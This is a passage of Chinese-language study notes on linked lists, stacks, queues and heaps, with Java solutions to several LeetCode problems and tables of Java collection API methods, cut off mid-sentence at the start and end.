size;\n    //虚拟头结点\n    ListNode head, tail;\n\n    public MyLinkedList() {\n        size = 0;\n        head = new ListNode(0);\n        tail = new ListNode(0);\n        //这一步非常关键，否则在加入头结点的操作中会出现null.next的错误！！！\n        head.next=tail;\n        tail.prev=head;\n    }\n    \n    public int get(int index) {\n        //判断index是否有效\n        if(index < 0 || index >= size) return -1;\n        ListNode cur = head;\n        //判断是哪一边遍历时间更短\n        if(index > size / 2) {\n            cur = tail;\n            for(int i = size; i > index; i--){\n                cur = cur.prev;\n            }\n        } else {\n            //包含一个虚拟头节点，所以查找第 index+1 个节点\n            for(int i = 0; i <= index; i++){\n                cur = cur.next;\n            }\n        }\n        return cur.val;\n    }\n    \n    public void addAtHead(int val) {\n         addAtIndex(0, val);\n    }\n    \n    public void addAtTail(int val) {\n        addAtIndex(size, val);\n    }\n    \n    public void addAtIndex(int index, int val) {\n        if(index > size) return;\n        if(index < 0) index = 0;\n        //找到前驱\n        ListNode pre = head;\n        for(int i = 0; i < index; i++){\n            pre = pre.next;\n        }\n        //新建结点\n        ListNode newNode = new ListNode(val);\n        //插入节点\n        newNode.next = pre.next;\n        pre.next.prev = newNode;\n        newNode.prev = pre; \n        pre.next = newNode;\n        size++;//节点数+1\n    }\n    \n\n    public void deleteAtIndex(int index) {\n        if (index < 0 || index >= size) {\n            return;\n        }\n        ListNode pre = head;\n        //找到要删除节点的前驱\n        for(int i = 0; i < index; i++){\n            pre = pre.next;\n        }\n        pre.next.next.prev = pre;\n        pre.next = pre.next.next;\n        \n        size--;\n    }\n}\n```\n\n#### [206. 反转链表 ](https://leetcode.cn/problems/reverse-linked-list/)\n\n给你单链表的头节点 `head` ，请你反转链表，并返回反转后的链表。\n\n**示例 1：**\n\n![](https://assets.leetcode.com/uploads/2021/02/19/rev1ex1.jpg)\n\n```\n输入：head = [1,2,3,4,5]\n输出：[5,4,3,2,1]\n```\n\n**示例 2：**\n\n![](https://assets.leetcode.com/uploads/2021/02/19/rev1ex2.jpg)\n\n```\n输入：head = [1,2]\n输出：[2,1]\n```\n\n**示例 3：**\n\n```\n输入：head = []\n输出：[]\n```\n\n**进阶：**链表可以选用迭代或递归方式完成反转。你能否用两种方法解决这道题？\n\n```java\n//迭代法（双指针法）\nclass Solution {\n    public ListNode reverseList(ListNode head) {\n        ListNode pre = null;\n        ListNode cur = head;\n        ListNode tmp = null;\n        while(cur != null){\n            tmp = cur.next;\n            cur.next = pre;\n            pre = cur;\n            cur = tmp;\n        }\n        return pre;\n    }\n}\n\n// 递归法\nclass Solution {\n    public ListNode reverseList(ListNode head) {\n        return reverse(null,head);\n    }\n    public ListNode reverse(ListNode pre, ListNode cur){\n        if (cur == null) {\n            return pre;\n        }\n        ListNode tmp = null;\n        tmp = cur.next;\n        cur.next = pre;\n        return reverse(cur,tmp);\n    }\n}\n\n//栈实现1(不推荐，效率不高)\nclass Solution {\n    public ListNode reverseList(ListNode head) {\n        Deque<ListNode> stack = new ArrayDeque<>();\n        while(head != null){\n            stack.push(head);\n            head = head.next;\n        }\n        ListNode dummy = new ListNode(0);\n        ListNode temp = dummy;\n        while(!stack.isEmpty()){\n            temp.next = stack.pop();\n            temp = temp.next;\n        }\n        temp.next = null; //最后节点不接null会形成环链\n        return dummy.next;\n    }\n}\n//栈实现2(不推荐，效率不高)\nclass Solution {\n    public ListNode reverseList(ListNode head) {\n        Deque<ListNode> stack = new ArrayDeque<>();\n        while(head != null){\n            stack.add(head);\n            head = head.next;\n        }\n        ListNode dummy = new ListNode(0),\n        ListNode temp = dummy;\n        while(stack.size() != 0){\n            temp.next = new ListNode(stack.pop());//防止形成环链\n            temp = temp.next;\n        }\n        return dummy.next;\n    }\n}\n\n```\n\n#### [24. 两两交换链表中的节点](https://leetcode.cn/problems/swap-nodes-in-pairs/)\n\n给你一个链表，两两交换其中相邻的节点，并返回交换后链表的头节点。你必须在不修改节点内部的值的情况下完成本题（即，只能进行节点交换）。\n\n**示例 1：**\n\n![](https://assets.leetcode.com/uploads/2020/10/03/swap_ex1.jpg)\n\n```\n输入：head = [1,2,3,4]\n输出：[2,1,4,3]\n```\n\n**示例 2：**\n\n```\n输入：head = []\n输出：[]\n```\n\n**示例 3：**\n\n```\n输入：head = [1]\n输出：[1]\n```\n\n**递归法：O(n)**\n\n- 1.返回值：交换完成的子链表\n- 2.调换：设需要交换的两个点为 first 和 second，first 连接后面交换完成的子链表，second 连接 first\n- 3.终止条件：head 为空指针或者 next 为空指针，也就是当前无节点或者只有一个节点，无法进行交换\n\n```java\nclass Solution {\n    public ListNode swapPairs(ListNode head) {\n        if(head == null || head.next == null){\n            return head;\n        }\n        ListNode first = head;\n        ListNode second = head.next;\n        first.next = swapPairs(second.next);\n        second.next = first;\n        return second;\n    }\n}\n```\n\n**迭代法：O(n)**\n\n| ![](https://img.jwt1399.top/img/202210251202982.png) | ![](https://img.jwt1399.top/img/202210251202275.png) |\n| ---------------------------------------------------- | ---------------------------------------------------- |\n\n```java\nclass Solution {\n    public ListNode swapPairs(ListNode head) {\n        ListNode dummyHead = new ListNode(0,head); //虚拟头节点\n        ListNode temp = dummyHead;\n        while (temp.next != null && temp.next.next != null) {\n            ListNode node1 = temp.next;\n            ListNode node2 = temp.next.next;\n            temp.next = node2;         //步骤一\n            node1.next = node2.next;  //步骤二\n            node2.next = node1; \t\t\t//步骤三\n            temp = node1; //后移两位，准备下一轮交换\n        }\n        return dummyHead.next;\n    }\n}\n```\n\n#### [19. 删除链表的倒数第 N 个结点](https://leetcode.cn/problems/remove-nth-node-from-end-of-list/)\n\n给你一个链表，删除链表的倒数第 `n` 个结点，并且返回链表的头结点。\n\n**示例 1：**\n\n![](https://assets.leetcode.com/uploads/2020/10/03/remove_ex1.jpg)\n\n```\n输入：head = [1,2,3,4,5], n = 2\n输出：[1,2,3,5]\n```\n\n**示例 2：**\n\n```\n输入：head = [1], n = 1\n输出：[]\n```\n\n**示例 3：**\n\n```\n输入：head = [1,2], n = 1\n输出：[1]\n```\n**暴力法：O(n)**\n\n```java\nclass Solution {\n    public ListNode removeNthFromEnd(ListNode head, int n) {\n        //计算链表长度\n        int length = 0;\n        ListNode temp = head;\n        while (temp != null) {\n            ++length;\n            temp = temp.next;\n        }\n        //删除节点\n        ListNode dummy = new ListNode(0, head);\n        ListNode cur = dummy;\n        for (int i = 0; i < length - n; i++) {\n            cur = cur.next;\n        }\n        cur.next = cur.next.next;\n        return dummy.next;\n    }\n}\n```\n\n**双指针法：O(n)**\n\n由于我们需要找到倒数第 n 个节点，因此我们可以使用两个指针 first 和 second 同时对链表进行遍历，并且 first比 second超前 n 个节点。当 first 遍历到链表的末尾时，second 就恰好处于倒数第 n 个节点。\n\n具体地，初始时 first和 second 均指向头节点。我们首先使用 first 对链表进行遍历，遍历的次数为 n。此时 first 比 second 超前了 n 个节点。在这之后，同时使用 first 和 second 对链表进行遍历。当 first 遍历到链表的末尾（即 first为空指针）时，second 恰好指向倒数第 n 个节点。\n\n```java\nclass Solution {\n    public ListNode removeNthFromEnd(ListNode head, int n) {\n        ListNode dummy = new ListNode(0, head);\n        ListNode first = head;\n        ListNode second = dummy;\n        for (int i = 0; i < n; i++) {\n            first = first.next;\n        }\n        while (first != null) {\n            first = first.next;\n            second = second.next;\n        }\n        second.next = second.next.next;\n        return dummy.next;\n    }\n}\n```\n\n#### [160. 相交链表](https://leetcode.cn/problems/intersection-of-two-linked-lists/)\n\n给你两个单链表的头节点 `headA` 和 `headB` ，请你找出并返回两个单链表相交的起始节点。如果两个链表不存在相交节点，返回 `null` 。\n\n图示两个链表在节点 `c1` 开始相交**：**\n\n[![](https://assets.leetcode-cn.com/aliyun-lc-upload/uploads/2018/12/14/160_statement.png)](https://assets.leetcode-cn.com/aliyun-lc-upload/uploads/2018/12/14/160_statement.png)\n\n题目数据 **保证** 整个链式结构中不存在环。\n\n**注意**，函数返回结果后，链表必须 **保持其原始结构** 。\n\n**示例 1：**\n\n[![](https://assets.leetcode.com/uploads/2021/03/05/160_example_1_1.png)](https://assets.leetcode.com/uploads/2018/12/13/160_example_1.png)\n\n```\n输入：intersectVal = 8, listA = [4,1,8,4,5], listB = [5,6,1,8,4,5], skipA = 2, skipB = 3\n输出：Intersected at '8'\n解释：相交节点的值为 8 （注意，如果两个链表相交则不能为 0）。\n从各自的表头开始算起，链表 A 为 [4,1,8,4,5]，链表 B 为 [5,6,1,8,4,5]。\n在 A 中，相交节点前有 2 个节点；在 B 中，相交节点前有 3 个节点。\n— 请注意相交节点的值不为 1，因为在链表 A 和链表 B 之中值为 1 的节点 (A 中第二个节点和 B 中第三个节点) 是不同的节点。换句话说，它们在内存中指向两个不同的位置，而链表 A 和链表 B 中值为 8 的节点 (A 中第三个节点，B 中第四个节点) 在内存中指向相同的位置。\n```\n\n**示例 2：**\n\n[![](https://assets.leetcode.com/uploads/2021/03/05/160_example_2.png)](https://assets.leetcode.com/uploads/2018/12/13/160_example_2.png)\n\n```\n输入：intersectVal = 2, listA = [1,9,1,2,4], listB = [3,2,4], skipA = 3, skipB = 1\n输出：Intersected at '2'\n解释：相交节点的值为 2 （注意，如果两个链表相交则不能为 0）。\n从各自的表头开始算起，链表 A 为 [1,9,1,2,4]，链表 B 为 [3,2,4]。\n在 A 中，相交节点前有 3 个节点；在 B 中，相交节点前有 1 个节点。\n```\n\n**示例 3：**\n\n[![](https://assets.leetcode-cn.com/aliyun-lc-upload/uploads/2018/12/14/160_example_3.png)](https://assets.leetcode.com/uploads/2018/12/13/160_example_3.png)\n\n```\n输入：intersectVal = 0, listA = [2,6,4], listB = [1,5], skipA = 3, skipB = 2\n输出：null\n解释：从各自的表头开始算起，链表 A 为 [2,6,4]，链表 B 为 [1,5]。\n由于这两个链表不相交，所以 intersectVal 必须为 0，而 skipA 和 skipB 可以是任意值。\n这两个链表不相交，因此返回 null 。\n```\n\n**进阶：**你能否设计一个时间复杂度 `O(m + n)` 、仅用 `O(1)` 内存的解决方案？\n\n考虑构建两个节点指针 `A` , `B` 分别指向两链表头节点 `headA` , `headB` ，做如下操作：\n\n- 指针 `A` 先遍历完链表 `headA` ，再开始遍历链表 `headB` ，当走到 `node` 时，共走步数为：a+(b−c)\n- 指针 `B` 先遍历完链表 `headB` ，再开始遍历链表 `headA` ，当走到 `node` 时，共走步数为：b+(a−c)\n\na+(b−c) = b+(a−c)，此时指针 `A` , `B` 重合 ，并有两种情况：\n\n1. 若两链表 **有** 公共尾部 (即 c>0 ) ：指针 `A` , `B` 同时指向「第一个公共节点」`node` 。\n2. 若两链表 **无** 公共尾部 (即 c=0) ：指针 `A` , `B` 同时指向 null 。\n\n因此返回 `A` 即可。\n\n```java\npublic class Solution {\n    public ListNode getIntersectionNode(ListNode headA, ListNode headB) {\n        ListNode A = headA;\n        ListNode B = headB;\n        while(A != B){\n            if(A != null) A = A.next;\n            else A = headB;\n            if(B != null) B = B.next;\n            else B = headA;\n        }\n        return A;\n    }\n}\n\n//简化代码\npublic class Solution {\n    public ListNode getIntersectionNode(ListNode headA, ListNode headB) {\n        ListNode A = headA;\n        ListNode B = headB;\n        while(A != B){\n            A = A != null ? A.next : headB;\n            B = B != null ? B.next : headA;\n        }\n        return A;\n    }\n}\n```\n\n#### [142. 环形链表 II ](https://leetcode.cn/problems/linked-list-cycle-ii/description/)\n\n给定一个链表的头节点  `head` ，返回链表开始入环的第一个节点。 _如果链表无环，则返回 `null`。_\n\n如果链表中有某个节点，可以通过连续跟踪 `next` 指针再次到达，则链表中存在环。 为了表示给定链表中的环，评测系统内部使用整数 `pos` 来表示链表尾连接到链表中的位置（**索引从 0 开始**）。如果 `pos` 是 `-1`，则在该链表中没有环。**注意：`pos` 不作为参数进行传递**，仅仅是为了标识链表的实际情况。\n\n**不允许修改** 链表。\n\n**示例 1：**\n\n![](https://assets.leetcode.com/uploads/2018/12/07/circularlinkedlist.png)\n\n```\n输入：head = [3,2,0,-4], pos = 1\n输出：返回索引为 1 的链表节点\n解释：链表中有一个环，其尾部连接到第二个节点。\n```\n\n**示例 2：**\n\n![](https://assets.leetcode-cn.com/aliyun-lc-upload/uploads/2018/12/07/circularlinkedlist_test2.png)\n\n```\n输入：head = [1,2], pos = 0\n输出：返回索引为 0 的链表节点\n解释：链表中有一个环，其尾部连接到第一个节点。\n```\n\n**示例 3：**\n\n![](https://assets.leetcode-cn.com/aliyun-lc-upload/uploads/2018/12/07/circularlinkedlist_test3.png)\n\n```\n输入：head = [1], pos = -1\n输出：返回 null\n解释：链表中没有环。\n```\n\n**进阶：**你是否可以使用 `O(1)` 空间解决此题？\n\n------\n\n**方法一：哈希表**\n\n遍历链表中的每个节点，并将它记录下来；一旦遇到了此前遍历过的节点，就可以判定链表中存在环。\n\n```java\npublic class Solution {\n    public ListNode detectCycle(ListNode head) {\n        Set<ListNode> set = new HashSet<>();\n        ListNode temp = head;\n        while(temp != null){\n            if(set.contains(temp)){\n                return temp;\n            }\n            set.add(temp);\n            temp = temp.next;\n        }\n        return null;\n    }\n}\n```\n\n时间复杂度：O(N)，其中 N 为链表中节点的数目。我们恰好需要访问链表中的每一个节点。\n\n空间复杂度：O(N)，其中 N 为链表中节点的数目。我们需要将链表中的每个节点都保存在哈希表当中。\n\n**方法二：快慢指针**\n\n```java\npublic class Solution {\n    public ListNode detectCycle(ListNode head) {\n        ListNode fast = head, slow = head;\n        while(true){\n            if(fast == null || fast.next == null) return null;\n            fast = fast.next.next;\n            slow = slow.next;\n            if(fast == slow) break;\n        }\n        fast = head;\n        while(fast != slow){\n            fast = fast.next;\n            slow = slow.next;\n        }\n        return fast;\n    }\n}\n```\n\n## ③栈&队列&堆\n\n### ❶普通队列-Queue\n\n> 队列是一种先进先出的数据结构，元素从后端入队，然后从前端出队。\n\n```java\nQueue<> queue = new LinkedList<>();\n```\n\n常用方法\n\n| 函数                    | 功能                           |\n| ----------------------- | ------------------------------ |\n| add(E e)/**offer(E e)** | 压入元素                       |\n| remove()/**poll()**     | 弹出元素                       |\n| element()/**peek()**    | 获取队头元素                   |\n| isEmpty()               | 用于检查此队列是“空”还是“非空” |\n| size()                  | 获取队列长度                   |\n\n###  ❷双端队列-Deque\n\nJava集合提供了接口`Deque`来实现一个双端队列，它的功能是：\n\n- 既可以添加到队尾，也可以添加到队首；\n- 既可以从队首获取，又可以从队尾获取。\n\n**Deque有三种用途**\n\n- 普通队列(一端进另一端出):\n\n```java\nDeque<> queue = new LinkedList<>(); \n// 等价 \nQueue<> queue = new LinkedList<>();\n```\n\n| **Queue方法** | **等效Deque方法** |\n| ------------- | ----------------- |\n| add(e)        | addLast(e)        |\n| offer(e)      | offerLast(e)      |\n| remove()      | removeFirst()     |\n| poll()        | pollFirst()       |\n| element()     | getFirst()        |\n| peek()        | peekFirst()       |\n\n- 双端队列(两端都可进出)\n\n```java\n//底层：ArrayDeque（动态数组）和 LinkedList（链表）\nDeque<Integer> deque = new ArrayDeque<>();\nDeque<Integer> deque = new LinkedList<>(); \n```\n\n|          | **第一个元素 (头部)**     | **最后一个元素 (尾部)** |\n| -------- | ------------------------- | ----------------------- |\n| **插入** | addFirst(e)/offerFirst(e) | addLast(e)/offerLast(e) |\n| **删除** | removeFirst()/pollFirst() | removeLast()/pollLast() |\n| **获取** | getFirst()/peekFirst()    | getLast()/peekLast()    |\n\n- 堆栈(先进后出)\n\n```java\n//底层：ArrayDeque（动态数组）和 LinkedList（链表）\nDeque<Integer> stack = new LinkedList<>(); \nDeque<Integer> stack = new ArrayDeque<>(); //速度更快\n// 等价  \nStack<String> stack=new Stack<>();   \n```\n| **堆栈方法** | **等效Deque方法** |\n| ------------ | ----------------- |\n| push(e)      | addFirst(e)       |\n| pop()        | removeFirst()     |\n| peek()       | peekFirst()       |\n\nDeque所有方法\n\n| 方法                              | **描述**                                     |\n| --------------------------------- | -------------------------------------------- |\n| **添加功能**                      |                                              |\n| **push**(E)                       | 向队列头部插入一个元素,失败时抛出异常        |\n| **addFirst**(E)                   | 向队列头部插入一个元素,失败时抛出异常        |\n| **addLast**(E)                    | 向队列尾部插入一个元素,失败时抛出异常        |\n| **offerFirst**(E)                 | 向队列头部加入一个元素,失败时返回false       |\n| **offerLast**(E)                  | 向队列尾部加入一个元素,失败时返回false       |\n| **获取功能**                      |                                              |\n| **peek()**                        | 获取队列头部元素,队列为空时抛出异常          |\n| **getFirst**()                    | 获取队列头部元素,队列为空时抛出异常          |\n| **getLast**()                     | 获取队列尾部元素,队列为空时抛出异常          |\n| **peekFirst**()                   | 获取队列头部元素,队列为空时返回null          |\n| **peekLast**()                    | 获取队列尾部元素,队列为空时返回null          |\n| **删除功能**                      |                                              |\n| **removeFirstOccurrence**(Object) | 删除第一次出现的指定元素,不存在时返回false   |\n| **removeLastOccurrence**(Object)  | 删除最后一次出现的指定元素,不存在时返回false |\n| **弹出功能**                      |                                              |\n| **pop**()                         | 弹出队列头部元素,队列为空时抛出异常          |\n| **removeFirst**()                 | 弹出队列头部元素,队列为空时抛出异常          |\n| **removeLast**()                  | 弹出队列尾部元素,队列为空时抛出异常          |\n| **pollFirst**()                   | 弹出队列头部元素,队列为空时返回null          |\n| **pollLast**()                    | 弹出队列尾部元素,队列为空时返回null          |\n\n### ❸优先队列-PriorityQueue\n\n> 优先级队列其实**就是一个披着队列外衣的堆**，因为优先队列对外接口只是从队头取元素，从队尾添加元素，再无其他取元素的方式，看起来就是一个队列。\n>\n> PriorityQueue 是具有优先级别的队列，优先级队列的元素按照它们的自然顺序排序，或者由队列构造时提供的 Comparator 进行排序，这取决于使用的是哪个构造函数\n\n| 构造函数                                          | 描述                                                         |\n| ------------------------------------------------- | ------------------------------------------------------------ |\n| PriorityQueue()                                   | 使用默认的容量（11）创建一个优队列，元素的顺序规则采用的是自然顺序 |\n| PriorityQueue(int initialCapacity)                | 使用默认指定的容量创建一个优队列，元素的顺序规则采用的是自然顺序 |\n| PriorityQueue(Comparator\\<? super E\\> comparator) | 使用默认的容量队列，元素的顺序规则采用的是 comparator        |\n\n```java\n//默认按自然顺序（升序）检索的\nPriorityQueue<Integer> numbers = new PriorityQueue<>();\n\n//使用Comparator接口自定义此顺序\nPriorityQueue<int[]> queue = new PriorityQueue<int[]>(new Comparator<int[]>() {\n  public int compare(int[] m, int[] n) {\n    return m[1] - n[1];\n  }\n});\n```\n\n### ❹栈-Stack/Deque\n\n> 栈是一种后进先出的数据结构，元素从顶端入栈，然后从顶端出栈。\n>\n> 注意：Java 堆栈 Stack 类已经过时，Java 官方推荐使用 Deque 替代 Stack 使用。Deque 堆栈操作方法：push()、pop()、peek()。\n\n**创建栈**\n\n```java\n//方法一，弃用\nStack<E> stack=new Stack<>();\nStack<String> stack=new Stack<>();\n\n//方法二：推荐使用\n//底层：ArrayDeque（动态数组）和 LinkedList（链表）\nDeque stack = new ArrayDeque<String>();\nDeque stack = new LinkedList<String>();\n\nstack.push(\"a\");\nstack.pop();\nstack.push(\"b\");\nSystem.out.println(stack);\n```\n\n**常用方法**\n\n| 函数             | 功能                                |\n| ---------------- | ----------------------------------- |\n| push(T t)        | 压栈（向栈顶放入元素）              |\n| pop()            | 出栈（拿出栈顶元素，并得到它的值）  |\n| peek()           | 将栈顶元素返回，但是不从栈中移除它  |\n| search(Object o) | 返回对象在此堆栈上的从1开始的位置。 |\n| isEmpty()        | 判断栈是否为空                      |\n| size()           | 获取栈长度                          |\n\n### ❺堆-Heap\n\n> 堆通常可以被看做是**一棵完全二叉树的数组对象**。\n\n**堆的特性：**\n\n- 1.**堆是完全二叉树**，除了树的最后一层结点不需要是满的，其它的每一层从左到右都是满的，如果最后一层结点不是满的，那么要求左满右不满。\n\n- 2.**堆通常用数组来实现**。将二叉树的结点按照层级顺序放入数组中，根结点在位置1，它的子结点在位置2和3，而子结点的子结点则分别在位置4,5,6和7，以此类推。(0被废弃)\n\n<img src=\"https://img.jwt1399.top/img/202211071641699.png\" style=\"zoom: 50%;\" />\n\n如果一个结点的位置为`k`，则它的父结点的位置为`[k/2]`，而它的两个子结点的位置则分别为`2k`和`2k+1`。\n\n这样，在不使用指针的情况下，我们也可以通过计算数组的索引在树中上下移动：从a[k]向上一层，就令k等于k/2,向下一层就令k等于2k或2k+1。\n\n- 3.**每个结点都大于等于它的两个子结点**。这里要注意堆中仅仅规定了每个结点大于等于它的两个子结点，但这两个子结点的顺序并没有做规定，跟我们之前学习的二叉查找树是有区别的。\n\n**堆的API设计**\n\n![](../images/数据结构与算法/image-20221107164431979.png)\n\n```java\npublic class Heap<T extends Comparable<T>> {\n    //存储堆中的元素\n    private T[] items;\n    //记录堆中元素的个数\n    private int N;\n\n    public Heap(int capacity) {\n        this.items = (T[]) new Comparable[capacity + 1];\n        this.N = 0;\n    }\n\n    //判断堆中索引i处的元素是否小于索引j处的元素\n    private boolean less(int i, int j) {\n        return items[i].compareTo(items[j]) < 0;\n    }\n\n    //交换堆中i索引和j索引处的值\n    private void exch(int i, int j) {\n        T temp = items[i];\n        items[i] = items[j];\n        items[j] = temp;\n    }\n\n    //往堆中插入一个元素\n    public void insert(T t) {\n        items[++N] = t;\n        swim(N);\n    }\n\n    //使用上浮算法，使索引k处的元素能在堆中处于一个正确的位置\n    private void swim(int k) {\n        //通过循环，不断的比较当前结点的值和其父结点的值，如果发现父结点的值比当前结点的值小，则交换位置\n        while (k > 1) {\n            //比较当前结点和其父结点\n            if (less(k / 2, k)) {\n                exch(k / 2, k);\n            }\n            k = k / 2;\n        }\n    }\n\n    //删除堆中最大的元素,并返回这个最大元素\n    public T delMax() {\n        T max = items[1];\n        //交换索引1处的元素和最大索引处的元素，让完全二叉树中最右侧的元素变为临时根结点\n        exch(1, N);\n        //最大索引处的元素删除掉\n        items[N] = null;\n        //元素个数-1\n        N--;\n        //通过下沉调整堆，让堆重新有序\n        sink(1);\n        return max;\n    }\n\n    //使用下沉算法，使索引k处的元素能在堆中处于一个正确的位置\n    private void sink(int k) {\n        //循环对比k结点和其左子结点2k以及右子结点2k+1处中的较大值的元素大小，如果当前结点小，则需要交换位置\n        while (2 * k <= N) {\n            //获取当前结点的子结点中的较大结点\n            int max;//记录较大结点所在的索引\n            if (2 * k + 1 <= N) {\n                if (less(2 * k, 2 * k + 1)) {\n                    max = 2 * k + 1;\n                } else {\n                    max = 2 * k;\n                }\n            } else {\n                max = 2 * k;\n            }\n            //比较当前结点和较大结点的值\n            if (!less(k, max)) {\n                break;\n            }\n            //交换k索引处的值和max索引处的值\n            exch(k, max);\n            //变换k的值\n            k = max;\n        }\n    }\n\n    public static void main(String[] args) {\n        Heap<String> heap = new Heap<String>(20);\n        heap.insert(\"A\");\n        heap.insert(\"B\");\n        heap.insert(\"C\");\n        heap.insert(\"D\");\n        heap.insert(\"E\");\n        heap.insert(\"F\");\n        heap.insert(\"G\");\n\n        String del;\n        //循环删除\n        while ((del = heap.delMax()) != null) {\n            System.out.print(del + \",\");\n        }\n    }\n}\n```\n\n\n\n### ❻LeetCode真题\n\n#### [232. 用栈实现队列 ](https://leetcode.cn/problems/implement-queue-using-stacks/)\n\n请你仅使用两个栈实现先入先出队列。队列应当支持一般队列支持的所有操作（`push`、`pop`、`peek`、`empty`）：\n\n实现 `MyQueue` 类：\n\n-   `void push(int x)` 将元素 x 推到队列的末尾\n-   `int pop()` 从队列的开头移除并返回元素\n-   `int peek()` 返回队列开头的元素\n-   `boolean empty()` 如果队列为空，返回 `true` ；否则，返回 `false`\n\n**说明：**\n\n-   你 **只能** 使用标准的栈操作 —— 也就是只有 `push to top`, `peek/pop from top`, `size`, 和 `is empty` 操作是合法的。\n-   你所使用的语言也许不支持栈。你可以使用 list 或者 deque（双端队列）来模拟一个栈，只要是标准的栈操作即可。\n\n**示例 1：**\n\n```\n输入：\n[\"MyQueue\", \"push\", \"push\", \"peek\", \"pop\", \"empty\"]\n[[], [1], [2], [], [], []]\n输出：\n[null, null, null, 1, 1, false]\n\n解释：\nMyQueue myQueue = new MyQueue();\nmyQueue.push(1); // queue is: [1]\nmyQueue.push(2); // queue is: [1, 2] (leftmost is front of the queue)\nmyQueue.peek(); // return 1\nmyQueue.pop(); // return 1, queue is [2]\nmyQueue.empty(); // return false\n```\n\n------\n\n```java\nclass MyQueue {\n\n    Deque<Integer> inStack;\n    Deque<Integer> outStack;\n\n    public MyQueue() {\n         inStack = new ArrayDeque<>();   // 负责进栈\n         outStack = new ArrayDeque<>(); // 负责出栈\n    }\n    \n    public void push(int x) {\n        inStack.push(x);\n    }\n    \n    public int pop() {\n        // 若输出栈为空则将输入栈的全部数据依次弹出并压入输出栈\n        if(outStack.isEmpty()){ \n            while(!inStack.isEmpty()){\n                outStack.push(inStack.pop());\n            }\n        }\n        // 弹出输出栈栈顶元素（输出栈不为空直接弹出，为空时执行上面操作）\n        return outStack.pop();\n    }\n    \n    public int peek() {\n        // 若输出栈为空则将输入栈的全部数据依次弹出并压入输出栈\n        if(outStack.isEmpty()){ \n            while(!inStack.isEmpty()){\n                outStack.push(inStack.pop());\n            }\n        }\n        // 返回栈顶元素\n        return outStack.peek();\n\n    }\n    \n    public boolean empty() {\n        return inStack.isEmpty() && outStack.isEmpty();\n    }\n}\n```\n\n#### [225. 用队列实现栈](https://leetcode.cn/problems/implement-stack-using-queues/)\n\n请你仅使用两个队列实现一个后入先出（LIFO）的栈，并支持普通栈的全部四种操作（`push`、`top`、`pop` 和 `empty`）。\n\n实现 `MyStack` 类：\n\n-   `void push(int x)` 将元素 x 压入栈顶。\n-   `int pop()` 移除并返回栈顶元素。\n-   `int top()` 返回栈顶元素。\n-   `boolean empty()` 如果栈是空的，返回 `true` ；否则，返回 `false` 。\n\n**注意：**\n\n-   你只能使用队列的基本操作 —— 也就是 `push to back`、`peek/pop from front`、`size` 和 `is empty` 这些操作。\n-   你所使用的语言也许不支持队列。 你可以使用 list （列表）或者 deque（双端队列）来模拟一个队列 , 只要是标准的队列操作即可。\n\n**示例：**\n\n```\n输入：\n[\"MyStack\", \"push\", \"push\", \"top\", \"pop\", \"empty\"]\n[[], [1], [2], [], [], []]\n输出：\n[null, null, null, 2, 2, false]\n\n解释：\nMyStack myStack = new MyStack();\nmyStack.push(1);\nmyStack.push(2);\nmyStack.top(); // 返回 2\nmyStack.pop(); // 返回 2\nmyStack.empty(); // 返回 False\n```\n\n------\n\n```java\nclass MyStack {\n\n    Queue<Integer> queue1;\n    Queue<Integer> queue2;\n\n    public MyStack() {\n        queue1 = new LinkedList();   // 存储栈内的元素，\n        queue2 = new LinkedList();   // 入栈操作的辅助队列\n    }\n    public void push(int x) {\n        queue2.offer(x); //先存入queue2\n        //把queue1的也存入queue2\n        while(!queue1.isEmpty()){\n            queue2.offer(queue1.poll());\n        }\n        //最后交换queue1和queue2，将元素都放到queue1中\n        Queue<Integer> temp = queue1;\n        queue1 = queue2;\n        queue2 = temp;\n    }\n    \n    public int pop() {\n        return queue1.poll();\n    }\n    \n    public int top() {\n        return queue1.peek();\n\n    }\n    //queue1用于存储栈内的元素，因此只需要判断queue1是否为空即可\n    public boolean empty() {\n        return queue1.isEmpty();\n\n    }\n}\n```\n\n```java\n//一个队列实现栈\nclass MyStack {\n  \n    Queue<Integer> queue;\n\n    public MyStack() {\n        queue = new LinkedList<Integer>();\n    }\n    \n    //入栈操作时，首先获得入栈前的元素个数n，然后将元素入队到队列，再将队列中的前 n 个元素（即除了新入栈的元素之外的全部元素）依次出队并入队到队列，此时队列的前端的元素即为新入栈的元素，且队列的前端和后端分别对应栈顶和栈底。\n    public void push(int x) {\n        int n = queue.size();\n        queue.offer(x);\n        for (int i = 0; i < n; i++) {\n            queue.offer(queue.poll());\n        }\n    }\n    \n    public int pop() {\n        return queue.poll();\n    }\n    \n    public int top() {\n        return queue.peek();\n    }\n    \n    public boolean empty() {\n        return queue.isEmpty();\n    }\n}\n```\n\n#### [20. 有效的括号](https://leetcode.cn/problems/valid-parentheses/)\n\n给定一个只包括 `'('`，`')'`，`'{'`，`'}'`，`'['`，`']'` 的字符串 `s` ，判断字符串是否有效。\n\n有效字符串需满足：\n\n1.  左括号必须用相同类型的右括号闭合。\n2.  左括号必须以正确的顺序闭合。\n3.  每个右括号都有一个对应的相同类型的左括号。\n\n**示例 1：**\n\n```\n输入：s = \"()\"\n输出：true\n```\n\n**示例 2：**\n\n```\n输入：s = \"()[]{}\"\n输出：true\n```\n\n**示例 3：**\n\n```\n输入：s = \"(]\"\n输出：false\n```\n\n------\n\n```java\nclass Solution {\n    public boolean isValid(String s) {\n        int n = s.length();\n        // 如果s的长度为奇数，一定不符合要求\n        if (n % 2 == 1) return false;\n        Map<Character, Character> map = new HashMap<Character, Character>() {{\n            put(')', '(');\n            put(']', '[');\n            put('}', '{');\n        }};\n        Deque<Character> stack = new LinkedList<>();\n        for(int i = 0; i < n; i++){\n            if(map.containsKey(s.charAt(i))){ //后括号则将对应前括号出栈\n                if (stack.isEmpty() || stack.peek() != map.get(s.charAt(i))) {\n                    return false;\n                }\n                stack.pop();\n            } else {\n                stack.push(s.charAt(i)); //前括号直接入栈\n            }\n        }\n        return stack.isEmpty();\n    }\n}\n```\n\n#### [1047. 删除字符串中的所有相邻重复项](https://leetcode.cn/problems/remove-all-adjacent-duplicates-in-string/)\n\n给出由小写字母组成的字符串 `S`，**重复项删除操作**会选择两个相邻且相同的字母，并删除它们。\n\n在 S 上反复执行重复项删除操作，直到无法继续删除。\n\n在完成所有重复项删除操作后返回最终的字符串。答案保证唯一。\n\n**示例：**\n\n```\n输入：\"abbaca\"\n输出：\"ca\"\n解释：\n例如，在 \"abbaca\" 中，我们可以删除 \"bb\" 由于两字母相邻且相同，这是此时唯一可以执行删除操作的重复项。之后我们得到字符串 \"aaca\"，其中又只有 \"aa\" 可以执行重复项删除操作，所以最后的字符串为 